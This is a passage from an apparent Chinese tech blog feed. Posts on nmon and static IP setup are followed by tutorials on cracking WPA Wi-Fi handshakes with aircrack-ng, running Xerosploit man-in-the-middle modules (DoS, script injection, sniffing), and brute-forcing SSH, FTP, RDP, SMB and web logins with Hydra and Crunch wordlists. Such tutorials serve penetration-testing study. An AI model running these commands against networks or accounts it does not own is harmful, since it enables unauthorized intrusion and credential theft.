&lt;filename&gt; User Defined Disk Groups (see above) - see BBBG &amp; DG lines</span><br><span class="line">        -N            include NFS Network File System</span><br><span class="line">        -I &lt;percent&gt;  Include process &amp; disks busy threshold (default 0.1)</span><br><span class="line">                      don't save or show proc/disk using less than this percent</span><br><span class="line">        -m &lt;directory&gt; 生成的数据文件的路径</span><br><span class="line">        例如：在30秒的时间间隔收集的top procs，持续1小时</span><br><span class="line">                 nmon.sh -f -t -r Test1 -s30 -c120</span><br><span class="line">        To load into a spreadsheet:</span><br><span class="line">        sort -A *nmon &gt;stats.csv</span><br><span class="line">        transfer the stats.csv file to your PC</span><br><span class="line">        Start spreadsheet &amp; then Open type=comma-separated-value ASCII file</span><br><span class="line">         The nmon analyser or consolidator does not need the file sorted.</span><br><span class="line"> </span><br><span class="line">Capacity planning mode - use cron to run each day</span><br><span class="line">        -x            sensible spreadsheet output for CP =  one day</span><br><span class="line">                      每15分钟1天 ( i.e. -ft -s 900 -c 96)</span><br><span class="line">        -X            sensible spreadsheet output for CP = busy hour</span><br><span class="line">                      每30秒1小时 ( i.e. -ft -s 30 -c 120)</span><br><span class="line"> </span><br><span class="line">交互模式命令</span><br><span class="line">        key --- Toggles to control what is displayed ---</span><br><span class="line">        h   = 联机帮助信息</span><br><span class="line">        r   = 机器类型，机器名，缓存信息和OS版本+LPAR</span><br><span class="line">        c   = CPU处理器统计条形图</span><br><span class="line">        l   = 条形图长期CPU（超过75个快照）</span><br><span class="line">        m   = 内存统计</span><br><span class="line">        L   = 巨大的内存页面统计</span><br><span class="line">        V   = 虚拟内存和交换统计</span><br><span class="line">        k   = 内核内部统计</span><br><span class="line">        n   = 网络统计和错误</span><br><span class="line">        N   = NFS网络文件系统</span><br><span class="line">        d   = 磁盘I/O图</span><br><span class="line">        D   = 磁盘I/O统计</span><br><span class="line">        o   = 磁盘I/O映射（每个磁盘上的一个字符显示它是多么繁忙）</span><br><span class="line">        j   = 文件系统</span><br><span class="line">        t   = 顶级进程统计使用1,3,4,5来选择数据及顺序</span><br><span class="line">        u   = 顶级进程命令的详细信息</span><br><span class="line">        v   = 详细简单的检查 - OK/Warn(警告)/Danger(危险)</span><br><span class="line">        b   = 黑白模式（或使用- b选项）</span><br><span class="line">        .   = 最小模式，即只显示繁忙的磁盘和进程</span><br><span class="line"> </span><br><span class="line">        key --- Other Controls ---</span><br><span class="line">        +   = 双屏幕刷新时间</span><br><span class="line">        -   = 一半的屏幕刷新时间</span><br><span class="line">        q   = 退出 (also x, e or control-C)</span><br><span class="line">        0   = 零峰计数复位 (峰值 = "&gt;")</span><br><span class="line">        space = 立即刷新屏幕</span><br><span class="line"> </span><br><span class="line">Startup Control</span><br><span class="line">        If you find you always type the same toggles every time you start</span><br><span class="line">        then place them in the NMON shell variable. For example:</span><br><span class="line">         export NMON=cmdrvtan</span><br><span class="line"> </span><br><span class="line">Others:</span><br><span class="line">        a) To you want to stop nmon - kill -USR2 &lt;nmon-pid&gt;</span><br><span class="line">        b) Use -p and nmon outputs the background process pid</span><br><span class="line">        c) To limit the processes nmon lists (online and to a file)</span><br><span class="line">           Either set NMONCMD0 to NMONCMD63 to the program names</span><br><span class="line">           or use -C cmd:cmd:cmd etc. example: -C ksh:vi:syncd</span><br><span class="line">        d) If you want to pipe nmon output to other commands use a FIFO:</span><br><span class="line">           mkfifo /tmp/mypipe</span><br><span class="line">           nmon -F /tmp/mypipe &amp;</span><br><span class="line">           grep /tmp/mypipe</span><br><span class="line">        e) If nmon fails please report it with:</span><br><span class="line">           1) nmon version like: 14g</span><br><span class="line">           2) the output of cat /proc/cpuinfo</span><br><span class="line">           3) some clue of what you were doing</span><br><span class="line">           4) I may ask you to run the debug version</span><br><span class="line">        Developer Nigel Griffiths</span><br><span class="line">        Feedback welcome - on the current release only and state exactly the problem</span><br><span class="line">        No warranty given or implied.</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_72/com.ibm.aix.cmds4/nmon.htm" target="_blank" rel="noopener">IBM-nmon</a></p>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
          <category> 性能监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> 性能监控 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>修改固定Ip 与DNS</title>
      <link href="/2017/09/27/yunwei/%E4%BF%AE%E6%94%B9%E5%9B%BA%E5%AE%9AIp-%E4%B8%8EDNS/"/>
      <url>/2017/09/27/yunwei/%E4%BF%AE%E6%94%B9%E5%9B%BA%E5%AE%9AIp-%E4%B8%8EDNS/</url>
      
        <content type="html"><![CDATA[<p>Ubuntu  / Centos</p><ul><li>静态ip</li><li>DNS</li></ul><a id="more"></a><p><br></p><ol><li><p>修改静态ip      </p><ol><li><p>ubuntu 编辑文件 /etc/network/interface</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">#auto lo</span><br><span class="line">#iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line"></span><br><span class="line">address 192.168.2.250</span><br><span class="line">gateway 192.168.2.1</span><br><span class="line">netmask 255.255.255.0</span><br></pre></td></tr></table></figure></li><li><p>CentOS 编辑 /etc/sysconfig/network-scripts/ifcfg-eth0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=eth0</span><br><span class="line">UUID=407367ac-fe2a-4b92-8d73-40d4e44a6e3b</span><br><span class="line">DEVICE=eth0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line">IPADDR=192.168.2.254</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.2.1</span><br><span class="line">DNS2=114.114.114.114</span><br><span class="line">IPV6_PEERDNS=yes</span><br><span class="line">IPV6_PEERROUTES=yes</span><br><span class="line">IPV6_PRIVACY=no</span><br><span class="line">ZONE=public</span><br></pre></td></tr></table></figure></li></ol></li></ol><p>​        </p><ol><li><p>修改DNS 域名:    vi  /etc/resolv.conf</p><ol><li><p>ubuntu 与 CentOS 配置相同</p><p> #    Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)<br> #     DO NOT EDIT THIS FILE BY HAND – YOUR CHANGES WILL BE OVERWRITTEN<br> nameserver 8.8.8.8<br> nameserver 114.114.114.114</p></li></ol></li></ol><ol><li><p>重启网络或者重启网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service networking status  ## restart</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0  down  // up 启动;</span><br><span class="line">ifconfig eth0  up</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MacBook 破解Wifi</title>
      <link href="/2017/09/23/kali/MacBook-%E7%A0%B4%E8%A7%A3Wifi/"/>
      <url>/2017/09/23/kali/MacBook-%E7%A0%B4%E8%A7%A3Wifi/</url>
      
        <content type="html"><![CDATA[<p>个人使用MacBook Pro系统<br>破解本人wifi, <font color="red"> 仅供学习研究专用 </font></p><a id="more"></a><p><br></p><p>MacBook 版本信息:</p><p><img src="/img/kali/wifi/macbook-info.png" alt="MacBook Info"></p><p><br></p><h4 id="安装aircrack-ng"><a href="#安装aircrack-ng" class="headerlink" title="安装aircrack-ng"></a>安装aircrack-ng</h4><p><a href="https://www.macports.org/install.php" target="_blank" rel="noopener">Mac ports 下载</a></p><p>使用Mac Book 自带wifi工具:</p><ol><li><p>查看周围Wifi信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport  -s   ## 查看周围wifi</span><br><span class="line"></span><br><span class="line">可在.bashrc / .zshrc 中设置 </span><br><span class="line">alias airport=&apos;/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#&gt;   airport -s </span><br><span class="line">                </span><br><span class="line">     SSID BSSID                    RSSI CHANNEL  HT CC SECURITY (auth/unicast/group)</span><br><span class="line"> Xiaomi_5273 64:09:80:13:52:74     -82  11       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)</span><br><span class="line"> Rexel-SSC 3c:8c:40:fd:67:c2       -76  48       Y  NO WPA2(PSK/AES/AES)</span><br><span class="line"> Rexel-Guest 3c:8c:40:fd:67:c1     -76  48       Y  NO WPA2(PSK/AES/AES)</span><br><span class="line"> rabbithouse d4:ee:07:0a:a8:d8     -80  6,-1     Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line"> Rexel-SSC 3c:8c:40:fd:67:d2       -49  1        Y  NO WPA2(PSK/AES/AES)</span><br><span class="line"> Rexel-Guest 3c:8c:40:fd:67:d1     -48  1        Y  NO WPA2(PSK/AES/AES)</span><br><span class="line"> MERCURY_7DA8 e4:f3:f5:c6:7d:a8    -74  1,+1     Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line"> jovision 46:d9:e7:91:14:96        -88  11       Y  -- WPA2(PSK/AES,TKIP/TKIP)</span><br><span class="line"> D-Link_DIR-600M 34:08:04:7d:07:98 -73  11       Y  -- NONE</span><br><span class="line"> Xiaomi_F4C8 cc:2d:21:b1:91:81     -90  10,-1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line"> zsguopeng c8:3a:35:11:95:60       -77  9,-1     Y  -- WPA(PSK/AES/AES)</span><br><span class="line"> Unimation 8a:25:93:aa:54:c5       -37  9,-1     Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP)</span><br><span class="line"> TP-LINK_4EE6 80:89:17:8b:4e:e6    -72  6,-1     Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</span><br><span class="line"> DIRECT-FE-HP b0:5a:da:34:22:c6    -86  6        Y  -- WPA2(PSK/AES/AES)</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>捕获无线网络数据握手包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airport en0 sniff 11    ## 11 是指监测wifi 的信号 channel  airport -s 中查看</span><br><span class="line">## 生成的抓包数据 自动存储到 /tmp/airport***.cap</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>破解WIFI密码:</p><p>   airport可以使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。<strong>有一种攻击方式是reinjecting packet</strong>，它可以<strong>强制无线路由器重启，这样当用户自动连接时可以获得握手包</strong>。<br>   mdk3 进行路由器攻击, <a href="https://github.com/vagabond1132/mdk3-master" target="_blank" rel="noopener">下载</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo aircrack-ng -w crackstion-human-only-简.txt -b 8a:25:93:aa:54:c5 /tmp/airportSniffcmYNuz.cap   </span><br><span class="line"></span><br><span class="line">## -b  具体查看airport -s  中的ssid</span><br><span class="line">## -w  具体密码字典文件</span><br></pre></td></tr></table></figure><ol><li><blockquote><p>Error :错误：</p><p>​    Opening /tmp/airportSniffWtYJtf.cap<br>​    No valid WPA handshakes found..</p></blockquote><p>是因为airport sniff 监听时，并未有用户断开或者链接wifi   - 若是自己测试可以使用手机进行wifi链接，或断开，进行测试<br><img src="/img/kali/wifi/find-key.png" alt="Find Key"></p></li></ol></li></ol><p><br></p><h4 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI:"></a>WIFI:</h4><ul><li><p>SSID</p><blockquote><p>​    Service Set IDentifier</p><p>​    <strong>SSID</strong>就是手机上搜索到的wifi名字（本质是<strong>一串字符</strong>）</p></blockquote></li><li><p>BSSID</p><blockquote><p>​    Basic Service Set IDentifier</p><p>​    <strong>BSSID</strong>就是无线路由器的MAC地址（本质是<strong>一个MAC地址</strong>）</p></blockquote></li><li><p>ESSID</p><blockquote><p>​    Extended Service Set IDentifier</p><p>​    <strong>ESSID</strong>是一个比较抽象的概念，它实际上就和ssid相同（本质也是<strong>一串字符</strong>）</p></blockquote></li><li><p>RSSI </p><blockquote><p>Received Signal Strength Indication接收的信号强度指示，无线发送层的可选部分，用来判定链接质量，以及是否增大广播发送强度。</p></blockquote></li><li><p>CHANNEL </p><p><a href="http://gangzai.online/2017/08/08/kali/tp-link-%E4%BF%A1%E9%81%93/" target="_blank" rel="noopener">WIFI 信道</a></p></li></ul><p><br></p><h4 id="密码机制"><a href="#密码机制" class="headerlink" title="密码机制:"></a>密码机制:</h4><p>​    弱密码</p><p>​    手机号</p><p>​    姓名生日</p><p>​    节假日</p><p>​    各大网站泄露密码</p><p>​    </p><p>​    暴力无奈之举:  <a href="http://gangzai.online/2017/09/19/kali/HyDra/" target="_blank" rel="noopener">Crunch工具</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网渗透:Xerosploit</title>
      <link href="/2017/09/20/kali/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-xerosploit/"/>
      <url>/2017/09/20/kali/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-xerosploit/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。<br>  由bettercap和nmap强力驱动。</p></blockquote><a id="more"></a><p><br></p><ol><li><p>安装xerosploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/LionSec/xerosploit</span><br><span class="line"></span><br><span class="line">cd xerosploit &amp;&amp; sudo python install.py</span><br><span class="line"></span><br><span class="line">sudo xerosploit</span><br></pre></td></tr></table></figure></li><li><p>异常问题</p><blockquote><p> pcaprub.c:11:18: fatal error: pcap.h: No such file or directory</p><p> #include &lt;xpcap.h&gt;</p><p> compilation terminated.<br> Makefile:239: recipe for target ‘pcaprub.o’ failed<br> make: <em>*</em> [pcaprub.o] Error 1</p></blockquote><p>解决:   sudo gem install packetfu -v 1.1.11 &amp;&amp; apt-get install libpcap-dev</p><p>​</p><blockquote><p>root@kailvirtual:~/xerosploit# xerosploit</p><p>Traceback (most recent call last):<br>  File “/opt/xerosploit/xerosploit.py”, line 26, in <module></module></p><p>​    from terminaltables import DoubleTable</p><p>ImportError: No module named terminaltables<br>​</p><p>root@kailvirtual:~/xerosploit# xerosploit<br>Traceback (most recent call last):<br>  File “/opt/xerosploit/xerosploit.py”, line 27, in <module></module></p><p>​    from tabulate import tabulate</p><p>ImportError: No module named tabulate</p></blockquote><p>解决: pip install terminaltables &amp;&amp;  pip install.py tabulate</p></li></ol><p><br></p><h4 id="启动并应用"><a href="#启动并应用" class="headerlink" title="启动并应用:"></a>启动并应用:</h4><ol><li><p>启动</p><p><img src="/img/kali/xer-start.png" alt="start"></p></li><li><p>help  功能</p><p><img src="/img/kali/xer-help.png" alt="help"></p><ol><li><p>进行扫描网络</p><p><img src="/img/kali/xer-choose-target.png" alt="scan"></p></li><li><p>选择目标 - 并查看帮助</p><p><img src="/img/kali/xer-module.png" alt=""></p></li></ol></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pscan：端口扫描</span><br><span class="line"></span><br><span class="line">dos：对目标进行dos攻击</span><br><span class="line"></span><br><span class="line">ping：对目标进行ping是否存活</span><br><span class="line"></span><br><span class="line">injecthtml：将html注入到目标访问的网站中</span><br><span class="line"></span><br><span class="line">injectjs：将javascript注入到目标访问的网站中</span><br><span class="line"></span><br><span class="line">rdownload：替换目标下载的文件</span><br><span class="line"></span><br><span class="line">sniff：嗅探目标的流量信息</span><br><span class="line"></span><br><span class="line">dspoof：将所有http流量重定向到特定ip</span><br><span class="line"></span><br><span class="line">yplay：在目标的浏览器中后台播放youtube视频（还得fq）</span><br><span class="line"></span><br><span class="line">replace：替换目标访问网站的所有图片</span><br><span class="line"></span><br><span class="line">driftnet：查看目标访问网站的所有图片</span><br><span class="line"></span><br><span class="line">move：让目标访问网站变得抖动</span><br><span class="line"></span><br><span class="line">deface：将目标访问网站的所有页面替换成自己定义的html代码</span><br></pre></td></tr></table></figure>​​</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HyDra 暴力破解 以及字典生成工具</title>
      <link href="/2017/09/19/kali/HyDra/"/>
      <url>/2017/09/19/kali/HyDra/</url>
      
        <content type="html"><![CDATA[<h2 id="Hydra-简介"><a href="#Hydra-简介" class="headerlink" title="Hydra 简介:"></a>Hydra 简介:</h2><p>​    hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。<a href="http://www.thc.org/thc-hydra" target="_blank" rel="noopener">官网</a>，可支持AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码。</p><a id="more"></a><p><br></p><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明:"></a>参数说明:</h4><pre><code>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE|-x OPT -y]] | [-C FILE]] [-e nsr] [-u] [-f|-F] [-M FILE] [-o FILE] [-b FORMAT] [-t TASKS] [-T TASKS] [-w TIME] [-W TIME] [-m OPTIONS] [-s PORT] [-c TIME] [-S] [-O] [-4|6] [-I] [-vV] [-d] server service [OPTIONS]    -R     restore  a  previously aborted session. Requires a hydra.restore file was written. Options are restored, but can be changed by           setting them after -R on the command line            继续从上一次进度接着破解。    -S     connect via SSL             采用SSL链接。    -O     use old SSL v2 and v3    -s PORT           if the service is on a different default port, define it here           PORT 可通过这个参数指定非默认端口    -l LOGIN           or -L FILE login with LOGIN name, or load several logins from FILE           LOGIN 指定破解的用户，对特定用户破解。    -p PASS           or -P FILE try password PASS, or load several passwords from FILE           指定特定密码    -x min:max:charset           generate passwords from min to max length. charset can contain 1            for numbers, a for lowcase and A for upcase characters.            Any other character is added is put to the list.              Example: 1:2:a1%.              The generated passwords will be of length 1 to 2 and contain              lowcase letters, numbers and/or percent signs and dots.    -y     disable use of symbols in -x bruteforce, see above    -e nsr additional checks, &quot;n&quot; for null password, &quot;s&quot; try login as pass, &quot;r&quot; try the reverse login as pass        -e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探    -C FILE           colon separated &quot;login:pass&quot; format, instead of -L/-P options           FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数    -u     by default Hydra checks all passwords for one login and then tries the next login. This option loops around  the  pass-           words, so the first password is tried on all logins, then the next password.    -f     exit after the first found login/password pair (per host if -M)           在使用-M参数以后，找到第一对登录名或者密码的时候中止破解    -F     exit after the first found login/password pair for any host (for usage with -M)    -M FILE           server list for parallel attacks, one entry per line    -o FILE           write found login/password pairs to FILE instead of stdout    -b FORMAT           specify the format for the -o FILE: text(default), json, jsonv1    -t TASKS           run TASKS number of connects in parallel (default: 16)    -m OPTIONS           module specific options. See hydra -U &lt;module&gt; what options are available.    -w TIME           defines the max wait time in seconds for responses (default: 32)           -w TIME 设置最大超时的时间，单位秒，默认是32s。    -W TIME           defines  a  wait  time  between  each connection a task performs. This usually only makes sense if a low task number is           used, .e.g -t 1    -c TIME           the wait time in seconds per login attempt over all threads (-t 1 is recommended) This usually only makes  sense  if  a           low task number is used, .e.g -t 1    -4 / -6           prefer IPv4 (default) or IPv6 addresses    -v / -V           verbose mode / show login+pass combination for each attempt    -d     debug mode    -I     ignore an existing restore file (dont wait 10 seconds)    -h, --help           Show summary of options.</code></pre><p>针对破解主要看破解密码字典够不够强大：</p><ol><li><a href="http://crunch.apache.org/download.html" target="_blank" rel="noopener">crunch 工具</a>              Crunch是一种创建密码字典工具，该字典通常用于暴力破解</li><li><a href="">rtgen 工具</a>                 Rtgen工具用来生成彩虹表。彩虹表是一个庞大的和针对各种可能的字母组合预先计算好的哈希值的集合, 数据量比较大</li></ol><p><br></p><h4 id="破解示例："><a href="#破解示例：" class="headerlink" title="破解示例："></a>破解示例：</h4><ol><li><p>破解ssh:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh</span><br></pre></td></tr></table></figure></li><li><p>破解ftp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</span><br></pre></td></tr></table></figure></li><li><p>get方式提交，破解web登录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</span><br></pre></td></tr></table></figure></li><li><p>post方式提交，破解web登录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot;</span><br></pre></td></tr></table></figure><p>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,中的内容是表示错误猜解的返回信息提示。）</p></li></ol><ol><li><p>破解https:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</span><br></pre></td></tr></table></figure></li><li><p>破解teamspeak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span><br></pre></td></tr></table></figure></li><li><p>破解cisco:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P pass.txt 10.36.16.18 ciscohydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</span><br></pre></td></tr></table></figure></li><li><p>破解smb:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P pass.txt 10.36.16.18 smb</span><br></pre></td></tr></table></figure></li><li><p>破解pop3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l muts -P pass.txt my.pop3.mail pop3</span><br></pre></td></tr></table></figure></li><li><p>破解rdp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra ip rdp -l administrator -P pass.txt -V</span><br></pre></td></tr></table></figure></li><li><p>破解http-proxy:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P pass.txt http-proxy://10.36.16.1</span><br></pre></td></tr></table></figure></li><li><p>破解imap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -p secret 10.36.16.18 imap PLAINhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h3 id="Crunch-工具使用"><a href="#Crunch-工具使用" class="headerlink" title="Crunch 工具使用:"></a>Crunch 工具使用:</h3><h4 id="Mac-安装"><a href="#Mac-安装" class="headerlink" title="Mac 安装:"></a>Mac 安装:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install crunch</span><br></pre></td></tr></table></figure><ol><li><p>启动说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crunch version 3.6</span><br><span class="line"></span><br><span class="line">Crunch can create a wordlist based on criteria you specify.  The outout from crunch can be sent to the screen, file, or to another program.</span><br><span class="line"></span><br><span class="line">Usage: crunch &lt;min&gt; &lt;max&gt; [options]</span><br><span class="line">where min and max are numbers</span><br><span class="line"></span><br><span class="line">Please refer to the man page for instructions and examples on how to use crunch.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch [minimum length] [maximum length] [character set] [options]</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crunch命令常用的选项如下所示。+</span><br><span class="line"></span><br><span class="line">-o：用于指定输出字典文件的位置。</span><br><span class="line">-b：指定写入文件最大的字节数。该大小可以指定KB、MB或GB，但是必须与-o START选项一起使用。</span><br><span class="line">-t：设置使用的特殊格式。</span><br><span class="line">-l：该选项用于当-t选项指定@、%或^时，用来识别占位符的一些字符。</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>示例:</p><figure 